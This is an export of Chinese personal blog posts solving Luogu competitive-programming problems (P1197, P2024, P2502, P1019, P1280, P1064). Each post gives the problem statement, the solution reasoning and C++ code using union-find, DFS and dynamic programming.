我们可算出第三个集合的基数与第二个集合的基数(从终点dfs，终止条件是vis2[n]或 n == st) 另外： 当遍历到的点属于第一次dfs的点的集合时 (确切的说，是处于第一集合与第二集合的并集中，且由于遍历以起始点作为终点，所以我们不会遍历到第一集合的点，所以结论是这些点就属于第二集合的点，且这些点的集合就是第二集合) ，我们可以用第一次计算到的基数之和减去这些点的集合的基数，得到的就是第一集合的基数 当遍历到的点不属于第一次dfs的点的集合时，这个点就属于第三集合，且这些点的集合就是第三集合 用图来解释一下： 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 300050 using namespace std; int h[N], n, st, ed, length; long long ans, cnt1 = 0, cnt2 = 0; bool vis1[N], vis2[N]; struct Edge { int next, to; }edge[2 * N];//要注意啊，无向图装配两次所以要开两倍qwq void Equip(int x, int y) { length++; edge[length].to = y; edge[length].next = h[x]; h[x] = length; } void dfs1(int x) { if(vis1[x] || x == ed) return; cnt1++; vis1[x] = true; for(int e = h[x]; e; e = edge[e].next) if(!vis1[edge[e].to]) dfs1(edge[e].to); } void dfs2(int x) { if(vis2[x] || x == st) return; if(vis1[x]) cnt1--; else cnt2++; vis2[x] = true; for(int e = h[x]; e; e = edge[e].next) if(!vis2[edge[e].to]) dfs2(edge[e].to); } int main() { scanf(&quot;%d%d%d&quot;, &amp;n, &amp;st, &amp;ed); ans = 1ll * n * n - n; //1ll :表示数据类型为long long，数据值为1的常量 int tmp1, tmp2; for(int i = 1; i &lt;= n - 1; i++) { scanf(&quot;%d%d&quot;, &amp;tmp1, &amp;tmp2); Equip(tmp1, tmp2); Equip(tmp2, tmp1); } dfs1(st); dfs2(ed); ans -= cnt1 * cnt2; printf(&quot;%lld&quot;, ans); }##虽然是好简单一道题但是还是为了写写容斥而且英文题看着好装逼啊虽然看着翻译做的哈哈哈哈就放上来了哈哈哈哈哈哈","tags":[{"name":"容斥","slug":"容斥","permalink":"https://v25bh145.github.io/tags/%E5%AE%B9%E6%96%A5/"},{"name":"搜索","slug":"搜索","permalink":"https://v25bh145.github.io/tags/%E6%90%9C%E7%B4%A2/"}]},{"title":"Question-P1197","date":"2020-02-16T07:39:35.000Z","path":"2020/02/16/questions/Question-P1197/","text":"P1197题目描述很久以前，在一个遥远的星系，一个黑暗的帝国靠着它的超级武器统治着整个星系。 某一天，凭着一个偶然的机遇，一支反抗军摧毁了帝国的超级武器，并攻下了星系中几乎所有的星球。这些星球通过特殊的以太隧道互相直接或间接地连接。 但好景不长，很快帝国又重新造出了他的超级武器。凭借这超级武器的力量，帝国开始有计划地摧毁反抗军占领的星球。由于星球的不断被摧毁，两个星球之间的通讯通道也开始不可靠起来。 现在，反抗军首领交给你一个任务：给出原来两个星球之间的以太隧道连通情况以及帝国打击的星球顺序，以尽量快的速度求出每一次打击之后反抗军占据的星球的连通块的个数。（如果两个星球可以通过现存的以太通道直接或间接地连通，则这两个星球在同一个连通块中）。 输入格式输入文件第一行包含两个整数，n, m，分别表示星球的数目和以太隧道的数目。星球用 0 ∼ n−1 的整数编号。 接下来的 m 行，每行包括两个整数 x,y，表示星球 x 和星球 y 之间有 “以太” 隧道，可以直接通讯。 接下来的一行为一个整数 k ，表示将遭受攻击的星球的数目。 接下来的 k 行，每行有一个整数，按照顺序列出了帝国军的攻击目标。这 k 个数互不相同，且都在 0 到 n-1 的范围内。 输出格式第一行是开始时星球的连通块个数。接下来的 k 行，每行一个整数，表示经过该次打击后现存星球的连通块个数。 输入输出样例输入8 13 0 1 1 6 6 5 5 0 0 6 1 2 2 3 3 4 4 5 7 1 7 2 7 6 3 6 5 1 6 3 5 7输出1 1 1 2 3 3说明/提示【数据范围】对于 100% 的数据，1 &lt; m &lt; $2*10^{5}$ , 1 &lt; n &lt; 2m (JSOI2008) 听歌 白箱真好看 解首先想到的是动态的并查集，允许删除操作，在毁灭星球的时候删除依赖这个星球交互的行星，但是并查集只支持一个无序集合，并没有支持元素之间联系的线段 看来只剩更改并查集这个数据结构了？ 在毁灭星球的时候，星球之间的边也随之毁灭，我们需要记下来每个星球的边，考虑到是个稀疏图，可以用邻接表存边 然后我们需要根据边数实时建立起多个集合，实在是太麻烦了 然后把思维逆转一下，不用“实时”的操作，也就是offline操作，可以把“毁灭”变为“建立”，也就可以使用并查集动态从后向前维护了 具体思路是这样子： 将没有被(不会被)毁灭的行星放到一个并查集 –初始化操作 倒序录入已经毁灭的行星与已经毁灭的行星与未被毁灭的行星的关系 将集合的个数作为结果存入那一次毁灭之前的答案中 ps: 集合的个数可以用并查集中的边数表示，算法类似于最小生成树kruskal 当然输出的结果是倒序，我们还需要存储个结果，反向输出 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 400050 #define M 200050 using namespace std; int n, m, h[N], km = 0, arrayK[N], k, current = 0, ans[N], father[N]; bool del[N]; //并查集素质三连 int Find(int x) { if(father[x] != x) father[x] = Find(father[x]); return father[x]; } void Union(int x, int y){father[Find(x)] = Find(father[y]);} bool Judge(int x, int y){return Find(x) == Find(y);} //前向星存图 struct Edge{int toN, nextE, fromN;}edge[2 * M]; void Equip(int x, int y) { km++; edge[km].nextE = h[x]; edge[km].toN = y; h[x] = km; edge[km].fromN = x; } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); int a, b; for(int i = 0; i &lt; n; i++) father[i] = i; for(int i = 1; i &lt;= m; i++) { scanf(&quot;%d%d&quot;, &amp;a, &amp;b); Equip(a, b); Equip(b, a); } scanf(&quot;%d&quot;, &amp;k); for(int i = 1; i &lt;= k; i++) { scanf(&quot;%d&quot;, &amp;a); arrayK[i] = a; del[a] = true; } /* 当然初始化也有两种思路 * 遍历点，如果星球不会被毁灭，则搜索与之相连的边，如果连接到的星球也不会被毁灭，则合并集合 * 事实证明，这种方法的效率更快 */ for(int i = 0; i &lt; n; i++) { if(!del[i]) { current++; for(int t = h[i]; t; t = edge[t].nextE) { if(!del[edge[t].toN] &amp;&amp; !Judge(i, edge[t].toN)) { Union(i, edge[t].toN); current--; } } } } // 遍历边，如果两边的星球都不会被毁灭，则合并两星球 /* current = n - k; for(int i = 1; i &lt;= 2 * m; i++) { if(!del[edge[i].fromN] &amp;&amp; !del[edge[i].toN] &amp;&amp; !Judge(edge[i].fromN, edge[i].toN)) { current--; Union(edge[i].fromN, edge[i].toN); } }*/ ans[k] = current; for(int i = k; i &gt;= 1; i--) { current++; del[arrayK[i]] = false; for(int t = h[arrayK[i]]; t; t = edge[t].nextE) { if(!del[edge[t].toN] &amp;&amp; !Judge(arrayK[i], edge[t].toN)) { Union(arrayK[i], edge[t].toN); current--; } } ans[i - 1] = current; } for(int i = 0; i &lt;= k; i++) printf(&quot;%d\\n&quot;, ans[i]); } 后续说起来你可能不信，我调了半个下午最后才发现我并查集路径压缩写错了","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"并查集","slug":"并查集","permalink":"https://v25bh145.github.io/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"}]},{"title":"Question-P2024","date":"2020-02-08T07:19:10.000Z","path":"2020/02/08/questions/Question-P2024/","text":"P2024 [NOI2001]食物链题目描述动物王国中有三类动物 A,B,C，这三类动物的食物链构成了有趣的环形。A 吃 B，B 吃 C，C 吃 A。 现有 N 个动物，以 1 － N 编号。每个动物都是 A,B,C 中的一种，但是我们并不知道 它到底是哪一种。 有人用两种说法对这 N 个动物所构成的食物链关系进行描述： 第一种说法是“1 X Y”，表示 X 和 Y 是同类。 第二种说法是“2 X Y”，表示 X 吃 Y 。 此人对 N 个动物，用上述两种说法，一句接一句地说出 K 句话，这 K 句话有的是真 的，有的是假的。当一句话满足下列三条之一时，这句话就是假话，否则就是真话。 • 当前的话与前面的某些真的话冲突，就是假话 • 当前的话中 X 或 Y 比 N 大，就是假话 • 当前的话表示 X 吃 X，就是假话 你的任务是根据给定的 N 和 K 句话，输出假话的总数。 输入格式从 eat.in 中输入数据 第一行两个整数，N，K，表示有 N 个动物，K 句话。 第二行开始每行一句话（按照题目要求，见样例） 输出格式输出到 eat.out 中 一行，一个整数，表示假话的总数。 输入输出样例输入 #1100 7 1 101 1 2 1 2 2 2 3 2 3 3 1 1 3 2 3 1 1 5 5输出 #13说明/提示1 ≤ N ≤ 5 ∗ 10^4 1 ≤ K ≤ 10^5 音乐 解首先，所有动物都可以被分为三类，或者说三个集合，可以考虑用并查集处理 这三个集合之间还有逻辑关系存在，是一个环形的食物链，我们可以直接想到用环形的链表去模拟，链表的节点就是并查集的祖宗， 为了简便，我们称中间的链表的上行为父，下行为子 之后有k句话，非假即真，我们需要先判断话语是否为假，不为假就是真的，即存储这个事实 之后需要考虑的东西： 如何去维护一个环形的链表？ 如何去判断这一句话是否为假？ 问题 #1首先考虑维护一个链表的连通性 在一个链表的 节点数&lt;3 时，使其不闭合，而当其 节点数=3 时，使其闭合，当 节点数&gt;3 时，使闭合链表的同时合并集合，将 第k节点 与 第k+3节点 合并 当两个链表合成的时候，我们需要对其中的集合进行合并，同时也要注意到需要维护 节点是祖宗 的性质 更具体的，输入 1 x y 时，在判断不为假之后，我们对两个链表合并，我们将左链表节点代表的集合的祖宗视为合并后节点上的代表祖宗，如果左链表无父/子，则补上右链表的节点代表的集合的祖宗为合并后节点上的代表祖宗，之后判断连通性即可(换句话说，有左边就左边为祖宗，左边没有就用右边) 输入 2 x y时，在判断不为假之后，我们对两个链表错位合并，如果左链表的节点有子，则执行1 x.son y，如果左链表的节点无子， 右链表的节点有父，则执行1 x y.fat,当左无子，右无父之后，合并右子与左父(如果都有的话)，之后直接使得左为右父，右为左子，判断连通性即可 问题 #2判断一句话是否为假，我们直接找出值在集合中的祖宗，在对应链表上查找即可 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define K 100500 #define N 60050 using namespace std; int n, k, father[N]; //并查集素质三连 inline int Find(int x) { if(x != father[x]) father[x] = Find(father[x]); return father[x]; } inline void Union(int x, int y) { father[Find(y)] = Find(father[x]); } inline bool Judge(int x, int y) { return Find(x) == Find(y); } //链表 struct Link { int f, s; }l[N]; //判断连通性 inline void Connect(int xRoot)//BUG: ³É»·Ö®ºó»¹ÐèÒªÖ´ÐÐÒ»±éÎÞÒâÒåµÄ { if(l[xRoot].s != xRoot &amp;&amp; l[l[xRoot].s].s != l[xRoot].s) { l[xRoot].f = l[l[xRoot].s].s; l[l[l[xRoot].s].s].s = xRoot; } else if(l[xRoot].f != xRoot &amp;&amp; l[xRoot].s != xRoot) { l[l[xRoot].f].f = l[xRoot].s; l[l[xRoot].s].s = l[xRoot].f; } else if(l[xRoot].f != xRoot &amp;&amp; l[l[xRoot].f].f != l[xRoot].f) { l[xRoot].s = l[l[xRoot].f].f; l[l[l[xRoot].f].f].f = xRoot; } } //合并两个链表 inline void UnionLink(int x, int y) { int xRoot = Find(x), yRoot = Find(y); if(xRoot == yRoot) return; if(l[yRoot].f != yRoot) { if(l[xRoot].f != xRoot) Union(l[xRoot].f, l[yRoot].f); else { l[xRoot].f = l[yRoot].f; l[l[xRoot].f].s = xRoot; } } if(l[yRoot].s != yRoot) { if(l[xRoot].s != xRoot) Union(l[xRoot].s, l[yRoot].s); else { l[xRoot].s = l[yRoot].s; l[l[xRoot].s].f = xRoot; } } Union(xRoot, yRoot); l[l[xRoot].s].s = l[xRoot].s; l[l[xRoot].f].f = l[xRoot].f; Connect(xRoot); } //判断是否相等(处于同一个集合) inline bool Equal(int x, int y) { x = Find(x); y = Find(y); bool res = true; if(l[x].f == y || l[x].f == l[y].s) res = false; else if(x == l[y].f || x == l[y].s) res = false; else if(l[x].s == l[y].f || l[x].s == y) res = false; if(res) { UnionLink(x, y); return true; } else return false; } //判断是否为捕食关系(处于链表上的两个父子关系集合) inline bool BeEaten(int x, int y) { x = Find(x); y = Find(y); if(l[x].s == y) return true; if(l[y].f != y) { if(Equal(x, l[y].f)) return true; else return false; } else if(l[x].s != x) { if(Equal(l[x].s, y)) return true; else return false; } else { l[x].s = y; l[y].f = x; if(l[y].s != y) { if(l[x].f != x) Union(l[x].f, l[y].s); else { l[x].f = l[y].s; l[l[y].s].s = x; } } l[l[x].s].s = l[x].s; l[l[x].f].f = l[x].f; Connect(x); return true; } } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for(int i = 1; i &lt;= n; i++) father[i] = l[i].f = l[i].s = i; int j, x, y, sum = 0; for(int i = 1; i &lt;= k; i++) { scanf(&quot;%d%d%d&quot;, &amp;j, &amp;x, &amp;y); if(j == 1) { if(x &gt; n || y &gt; n)sum++; else if(x != y &amp;&amp; !Equal(x, y)) sum++; } else if(j == 2) { if(x &gt; n || y &gt; n)sum++; else if(x == y)sum++; else if(!BeEaten(x, y)) sum++; } } printf(&quot;%d\\n&quot;, sum); }后话好久没更新了鸭！关键是沉迷于各种游戏和做游戏无法自拔，忘了懒得写题了QAQ 总之今后会一点一点慢慢来的！奥利给","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"并查集","slug":"并查集","permalink":"https://v25bh145.github.io/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"链表","slug":"链表","permalink":"https://v25bh145.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"Question-P2502","date":"2020-01-11T01:24:52.000Z","path":"2020/01/11/questions/Question-P2502/","text":"P2502题目描述Z小镇是一个景色宜人的地方，吸引来自各地的观光客来此旅游观光。Z小镇附近共有N个景点（编号为1,2,3,…,N），这些景点被M条道路连接着，所有道路都是双向的，两个景点之间可能有多条道路。也许是为了保护该地的旅游资源，Z小镇有个奇怪的规定，就是对于一条给定的公路Ri，任何在该公路上行驶的车辆速度必须为Vi。速度变化太快使得游客们很不舒服，因此从一个景点前往另一个景点的时候，大家都希望选择行使过程中最大速度和最小速度的比尽可能小的路线，也就是所谓最舒适的路线。 输入格式第一行包含两个正整数，N和M。 接下来的M行每行包含三个正整数：x，y和v。表示景点x到景点y之间有一条双向公路，车辆必须以速度v在该公路上行驶。 最后一行包含两个正整数s，t，表示想知道从景点s到景点t最大最小速度比最小的路径。s和t不可能相同。 输出格式如果景点s到景点t没有路径，输出“IMPOSSIBLE”。否则输出一个数，表示最小的速度比。如果需要，输出一个既约分数。 输入输出样例输入4 2 1 2 1 3 4 2 1 4输出IMPOSSIBLE输入3 3 1 2 10 1 2 5 2 3 8 1 3输出5/4 输入3 21 2 22 3 41 3 输出2 说明/提示【数据范围】 1&lt;N≤500 1≤x,y≤N，0&lt;v&lt;30000，x≠y 0&lt;M≤5000 听歌儿 解(人在机房，刚被囚禁，闲来无事写写博客，利益相关，匿了匿了) 一看数据范围，N至多500，第一个想到的算法是搜索，其要求的是最大速度/最小速度，(难道要求记录历史的所有速度？？) 所以放弃爆搜廖 之后想到了迪杰的堆优化贪心，(甚至还打了一遍)发现贪心策略不适合这个，因为速度要求的是极差最小，所以这种贪心只拿了30 (居然还拿了30？？) 最后翻了翻题解….emm 可以用类似最小生成树的算法做，先排序一遍，从最大开始，先遍历一遍，再从第一遍遍历的节点向后，一遍循环终止条件是起始点和终止点连接，最后记下最大速度/最小速度的值 (其实就是枚举辣！) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 550 #define M 5500 #define inf 0x7fffffff using namespace std; int n, m, tmp1, tmp2, tmp3, father[N], st, ed; struct Edge { int x, y, v; bool operator &lt; (const Edge a) const { return a.v &lt; v; } }edge[M]; int Find(int x)//并查集 { if(x != father[x]) father[x] = Find(father[x]); return father[x]; } int Union(int x, int y) { father[Find(x)] = Find(father[y]); } bool Judge(int x, int y) { if(Find(x) == Find(y)) return true; else return false; } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for(int i = 1; i &lt;= m; i++) { scanf(&quot;%d%d%d&quot;, &amp;tmp1, &amp;tmp2, &amp;tmp3); edge[i].x = tmp1; edge[i].y = tmp2; edge[i].v = tmp3; } scanf(&quot;%d%d&quot;, &amp;st, &amp;ed); sort(edge + 1, edge + 1 + m); int Max = inf, Min = 1; for(int i = 1, tmpN; i &lt;= m; i++) { for(int j = 1; j &lt;= n; j++) father[j] = j; for(tmpN = i; tmpN &lt;= m; tmpN++) { Union(edge[tmpN].x, edge[tmpN].y); if(Judge(st, ed)) break; } if(tmpN &lt;= m &amp;&amp; edge[i].v / (double)edge[tmpN].v &lt; Max / (double)Min)//这里记得转换成小数除法比较 { Max = edge[i].v; Min = edge[tmpN].v; } } if(Max == inf) printf(&quot;IMPOSSIBLE\\n&quot;); else { int num = __gcd(Max, Min); if(Min == num) printf(&quot;%d\\n&quot;, Max / num); else printf(&quot;%d/%d\\n&quot;, Max / num, Min / num); } }时间复杂度：O($n^{2}$)最后一个带问题：将重载的运算符换成&gt;=就会出问题，为什么鸭？？？爆了两个WA和一个MLE","tags":[{"name":"搜索","slug":"搜索","permalink":"https://v25bh145.github.io/tags/%E6%90%9C%E7%B4%A2/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"最小生成树","slug":"最小生成树","permalink":"https://v25bh145.github.io/tags/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"}]},{"title":"Question-P1019","date":"2019-12-18T11:44:30.000Z","path":"2019/12/18/questions/Question-P1019/","text":"P1019题目描述单词接龙是一个与我们经常玩的成语接龙相类似的游戏，现在我们已知一组单词，且给定一个开头的字母，要求出以这个字母开头的最长的“龙”（每个单词都最多在“龙”中出现两次），在两个单词相连时，其重合部分合为一部分，例如 beastbeast和astonishastonish，如果接成一条龙则变为beastonishbeastonish，另外相邻的两部分不能存在包含关系，例如atat 和 atideatide 间不能相连。 输入格式输入的第一行为一个单独的整数n (n≤20)表示单词数，以下n 行每行有一个单词，输入的最后一行为一个单个字符，表示“龙”开头的字母。你可以假定以此字母开头的“龙”一定存在. 输出格式只需输出以此字母开头的最长的“龙”的长度 输入输出样例输入 #15 at touch cheat choose tact a输出 #123说明/提示（连成的“龙”为atoucheatactactouchoose） NOIp2000提高组第三题 听歌儿 MC大法好 解康康数据规模，这题就是暴力枚举/线性的深度优先搜索 这样枚举(套用DFS模板即可)： Enum(last: int) 从1至nif 位置为i的单词尚未超过使用限额 且 位置为i的单词头部可以和上一个使用的单词尾部连接则 连接上此单词 将此单词标记为使用一次 递归Enum(i) 将此单词标记为取消使用一次 取消连接此单词继续循环 难点在于连接与取消连接 连接（融♂合）顺序遍历一遍字符串和接龙，计算他们最小重叠的长度 例如， C#nb 和 nb 的最小重叠长度就是2 如果最小重叠长度等于其中一个字符串的长度(也就是说覆盖辣)，这肯定是不行的鸭 之后进行连接操作，从重叠的那里连接就完事儿了 取消连接这个函数必须要传入三个值啊，接龙，上个连接的单词和这个连接的单词 我们需要算出两个单词的最小重叠长度，之后再使接龙部分减去这个单词没有重叠的部分 例如，hiahiahiahiahiahiahhh, hiahiahia, hiahhh 就必须算出最小重叠长度，之后使接龙减去没有重叠的部分就可以了 杂项的操作比如程序要求第一个开头固定，那我们就将接龙初始化为那个开头字母，之后第一次枚举的时候传入last = 0表示没有上一个单词的，然后在连接和取消连接的那里做一个spj(special judge) 代码#include &lt;iostream&gt; #include &lt;string&gt; #include &lt;cstring&gt; using namespace std; string words[22], sentence; char start; int n, MAX = 0; int isUsed[22]; void CancelConnect(int position, int last) { string tmp = words[position]; if(last == 0) { sentence = string(sentence.begin(), sentence.end() - tmp.length()); return; } string sLast = words[last]; int length = min(sLast.length(), tmp.length()); int radix = 0; for(int i = 0; i &lt; length; i++) { string s1 = string(sLast.end() - i, sLast.end()); string s2 = string(tmp.begin(), tmp.begin() + i); if(s1 == s2 &amp;&amp; s1.length() != 0) { if(radix == 0) radix = s1.length(); else radix = radix &lt; s1.length() ? radix : s1.length(); } } sentence = string(sentence.begin(), sentence.end() - tmp.length() + radix); } bool Connect(int position, int last) { string tmp = words[position]; int radix = 0; int length = min(sentence.length(), tmp.length()); for(int i = 0; i &lt;= length - 1; i++) { string s1 = string(sentence.end() - i, sentence.end()); string s2 = string(tmp.begin(), tmp.begin() + i); if(s1 == s2 &amp;&amp; s1.length() != 0) { if(radix == 0) radix = s1.length(); else radix = radix &lt; s1.length() ? radix : s1.length(); } } if(radix == 0 &amp;&amp; last != 0)//这里就是spj return false; string result = string(tmp.begin() + radix, tmp.end()); sentence = sentence + result; return true; } void Enum(int last) { MAX = MAX &gt; sentence.length() ? MAX : sentence.length(); for(int i = 1; i &lt;= n; i++) if(isUsed[i] &lt;= 1) { string sTmp = words[i]; if(last == 0 &amp;&amp; sTmp[0] != start) continue; if(Connect(i, last) == true) { isUsed[i]++; Enum(i); isUsed[i]--; CancelConnect(i, last); } } } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) isUsed[i] = 0; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;words[i]; cin&gt;&gt;start; sentence = string(1, start); Enum(0); cout&lt;&lt;MAX - 1&lt;&lt;endl; return 0; } 一开始太菜算成了最大重叠长度 写博客有点晚了，现在逐渐开始习惯输入进去C字符串scanf(%s, c);然后string s = string(c)了2333","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"深度优先搜索","slug":"深度优先搜索","permalink":"https://v25bh145.github.io/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"}]},{"title":"Question-P1280","date":"2019-12-11T14:23:59.000Z","path":"2019/12/11/questions/Question-P1280/","text":"P1280题目描述尼克每天上班之前都连接上英特网，接收他的上司发来的邮件，这些邮件包含了尼克主管的部门当天要完成的全部任务，每个任务由一个开始时刻与一个持续时间构成。 尼克的一个工作日为N分钟，从第一分钟开始到第N分钟结束。当尼克到达单位后他就开始干活。如果在同一时刻有多个任务需要完成，尼克可以任选其中的一个来做，而其余的则由他的同事完成，反之如果只有一个任务，则该任务必需由尼克去完成，假如某些任务开始时刻尼克正在工作，则这些任务也由尼克的同事完成。如果某任务于第P分钟开始，持续时间为T分钟，则该任务将在第P+T-1分钟结束。 写一个程序计算尼克应该如何选取任务，才能获得最大的空暇时间。 输入格式输入数据第一行含两个用空格隔开的整数N和K(1≤N≤10000，1≤K≤10000)，N表示尼克的工作时间，单位为分钟，K表示任务总数。 接下来共有K行，每一行有两个用空格隔开的整数P和T，表示该任务从第P分钟开始，持续时间为T分钟，其中1≤P≤N，1≤P+T-1≤N。 输出格式输出文件仅一行，包含一个整数，表示尼克可能获得的最大空暇时间。 输入输出样例输入 #115 6 1 2 1 6 4 11 8 5 8 1 11 5输出 #14 听音乐 炒鸡柔和的诶 (不愧是近月少女哈哈哈哈) 解资源分配型的DP问题 我们的资源是时间与工作，这里先模拟一下情况： (手绘好丑) 这里选择的最优解是第二条和第四条，第二条规避了第一条和第三条，第四条规避了第五条和第六条 这里我们可以再转变一下表示类型，变成有向图 是不是很清楚了？ f[i] = (f[i节点的前接节点j] + w[i][j] , f[i]) 怎么初始化呢？首先我们要对起始时间排序 只设置入度为零的点为初始化点，即起始时间最短的点，赋值为起始时间，考虑这样的点有多个，需要循环 之后默认每个点都不可达，为无穷小 怎么判断一个节点j是否是另外一个节点i的前接节点呢具有两条性质： j的终止时间在i的终止时间前面 没有任何一个节点的起始时间在 j的终止时间到i的起始时间的时间段内 1是2的特殊化 第二条怎么实现呢？ 倒序遍历i前的所有节点，设第一个与i起始值不一样的节点k，k节点的起始值就是判断的标准，且k节点一定为i节点的前接节点 *证明 k节点一定是i节点的前接节点 反证：若k节点不是i节点的前接节点，则一定有一个节点u的起始值在i的起始值之前k的末尾值之后，又知1~i-1的节点中k节点的起始值离i最近，所以这样的u不存在 k节点的起始值是判断的标准，若有u节点在k节点起始值至i节点起始值之间，则u是i的前接节点 反证：若u节点不是i的前接节点，则一定有一个节点v的起始值在u的末尾与i的起始之间，又知1~i-1的节点中k节点的起始值离i最近，所以这样的v不存在 上代码扒 #include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; int N, K, f[10050], jud[10050]; struct Node { int start; int end; }a[10050]; bool cmp(Node x, Node y) { if(x.start &lt; y.start) return true; else return false; } int main() { cin&gt;&gt;N&gt;&gt;K; int tmp; for(int i = 1; i &lt;= K; i++) { cin&gt;&gt;a[i].start&gt;&gt;tmp; a[i].end = a[i].start + tmp - 1; } //系统排序，以起始时间升序 sort(a + 1, a + 1 + K, cmp); //初始化不可达点与可达点 for(int i = 0; i &lt;= K; i++) f[i] = -1000000; f[1] = a[1].start - 1; int first = 2; while(a[first].start == a[1].start) { f[first] = a[1].start - 1; first++; } int mid, head; for(int i = 2; i &lt;= K; i++) { head = i - 1; //确定判断基准 while(a[head].start == a[i].start) head--; if(head == 0) head = 1; mid = a[head].start; for(int j = i - 1; j &gt;= 1; j--) if(a[j].end &lt; a[i].start &amp;&amp; a[j].end &gt;= mid) //转移方程 f[i] = max(f[i], f[j] + a[i].start - a[j].end - 1); } //对尾部时间操作，以最后一位的起始时间为基准 for(int i = 1; i &lt;= K; i++) if(a[i].end &gt;= a[K].start) f[i] += N - a[i].end; int MAX = f[1]; for(int i = 2; i &lt;= K; i++) MAX = MAX &gt; f[i] ? MAX : f[i]; cout&lt;&lt;MAX&lt;&lt;endl; return 0; } 写在最后这道题花了我一天啊！！！ 一道DP绿题QAQ 当然题的做法也可以DP总时间，我这里DP了工作数量 DP大法好！！ (然鹅我还是不会啊QAQ) (逃)","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"}]},{"title":"Question-P1064","date":"2019-12-09T13:27:22.000Z","path":"2019/12/09/questions/Question-P1064/","text":"P1064题目描述金明今天很开心，家里购置的新房就要领钥匙了，新房里有一间金明自己专用的很宽敞的房间。更让他高兴的是，妈妈昨天对他说：“你的房间需要购买哪些物品，怎么布置，你说了算，只要不超过NN元钱就行”。今天一早，金明就开始做预算了，他把想买的物品分为两类：主件与附件，附件是从属于某个主件的，下表就是一些主件与附件的例子： 主件 附件 电脑 打印机，扫描仪 书柜 图书 书桌 台灯，文具 工作椅 无 如果要买归类为附件的物品，必须先买该附件所属的主件。每个主件可以有0个、1个或2个附件。附件不再有从属于自己的附件。金明想买的东西很多，肯定会超过妈妈限定的N元。于是，他把每件物品规定了一个重要度，分为5等：用整数1-5表示，第5等最重要。他还从因特网上查到了每件物品的价格（都是10元的整数倍）。他希望在不超过N元（可以等于N元）的前提下，使每件物品的价格与重要度的乘积的总和最大。 设第j件物品的价格为v[j]，重要度为w[j]，共选中了k件物品，编号依次为 $j_{1},j_{2},……,j_{k}$ ，则所求的总和为： v[j1] * w[j1] + v[j2] * w[j2] + …… ＋ v[jk] * w[jk] 请你帮助金明设计一个满足要求的购物单。 输入格式第1行，为两个正整数，用一个空格隔开： N m （其中N(&lt;32000)表示总钱数，m(&lt;60)为希望购买物品的个数。） 从第2行到第m+1行，第j行给出了编号为j-1的物品的基本数据，每行有3个非负整数 v p q （其中v表示该物品的价格（v&lt;10000），p表示该物品的重要度（1-5），q表示该物品是主件还是附件。如果q=0，表示该物品为主件，如果q&gt;0，表示该物品为附件，q是所属主件的编号） 输出格式一个正整数，为不超过总钱数的物品的价格与重要度乘积的总和的最大值（&lt;200000）。 输入输出样例输入1000 5 800 2 0 400 5 1 300 5 1 400 3 0 500 2 0输出2200说明/提示NOIP 2006 提高组 第二题 听音乐~ 解首先这道题是一个0-1型背包问题，不过加了一层限制，如果想选择附件则必须要先选择对应的主件 首先考虑n呈10的整数倍，可以将空间缩小10倍，返回的解*10 考虑分组背包，每一个组包含主件和主件的附属，矛盾的选择是主件和不同附件的排列组合这样的时间复杂度是指数级了，每一个附件有选择或不选择两种状态 考虑优化，对每一个组内部进行0-1背包处理，计算不同体积下能获得的最大价格，矛盾的选择是在选择在此组消耗的体积 最后考虑关于动态规划的数组在空间上的优化，0-1背包问题使用一维数组存储单个组解，放在分组问题中组循环的内部，分组问题使用一维数组刷新的方式 代码#include &lt;iostream&gt; using namespace std; int N, m, groupOptimal[3250], optimal[3250]; int mGroup = 0; struct Group { int value; int cost; int sonValue[62]; int sonCost[62]; int length; } k[62]; int main() { cin&gt;&gt;N&gt;&gt;m; N = N / 10; for(int i = 0; i &lt;= m; i++) { //初始化操作,-1代表不存在 k[i].value = -1; k[i].length = 0; } int tmpValue, tmpPrior, tmpOf; for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmpValue&gt;&gt;tmpPrior&gt;&gt;tmpOf; if(tmpOf == 0) { k[i].value = tmpValue * tmpPrior / 10; k[i].cost = tmpValue / 10; } else { k[tmpOf].length++; k[tmpOf].sonValue[k[tmpOf].length] = tmpValue * tmpPrior / 10; k[tmpOf].sonCost[k[tmpOf].length] = tmpValue / 10; } } for(int i = 1; i &lt;= m; i++) if(k[i].value != -1) //若组存在，则组的数目自增1 { mGroup++; swap(k[mGroup], k[i]); } for(int i = 1; i &lt;= mGroup; i++) //动态规划数组初始化，放入主件 { for(int j = 0; j &lt;= N; j++) { if(j &gt;= k[i].cost) groupOptimal[j] = k[i].value; else groupOptimal[j] = -100000000; } for(int v = 1; v &lt;= k[i].length; v++) for(int j = N; j &gt;= k[i].cost; j--) if(j - k[i].sonCost[v] &gt;= 0) groupOptimal[j] = max(groupOptimal[j], groupOptimal[j - k[i].sonCost[v]] + k[i].sonValue[v]); for(int j = N; j &gt;= 0; j--) for(int u = j; u &gt;= k[i].cost; u--) optimal[j] = max(optimal[j], optimal[j - u] + groupOptimal[u]); } cout&lt;&lt;optimal[N] * 10&lt;&lt;endl; return 0; } 复杂度：$O(m^{2}N + mN^{2})$绰绰有余辣 